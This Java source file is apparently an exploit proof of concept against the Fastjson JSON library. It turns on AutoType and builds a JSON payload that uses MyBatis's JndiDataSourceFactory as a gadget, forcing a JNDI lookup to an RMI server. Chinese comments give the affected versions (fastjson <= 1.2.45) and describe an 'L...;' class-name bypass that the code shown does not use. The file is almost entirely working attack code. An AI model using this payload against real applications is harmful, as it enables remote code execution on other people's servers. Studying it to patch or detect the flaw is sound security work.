package com.yyjccc.fastjson.exp.bypass.autotype;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


/**
 * 条件：需要开启AutoType
 * jdk: 8
 * 版本：1 fastjson <= 1.2.45
 * 补丁：添加AutoTypeSupport检查机制
 * 描述： 在@type指定的类前面加上L后面加上;
 */
public class MybatisJNDIGadget {
	public static void main(String[] args) {
		ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
		String jndi="rmi://127.0.0.1:8085/ngmjzGDj";
		JSON.parse(mybatisJNDIPayload(jndi));
	}


	public static String mybatisJNDIPayload(String jndiAddress){
		String data="{\n\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n\"properties\":{\n\"data_source\":\""+jndiAddress+"\"\n}\n}";
		System.out.println(data);
		return data;
	}
}
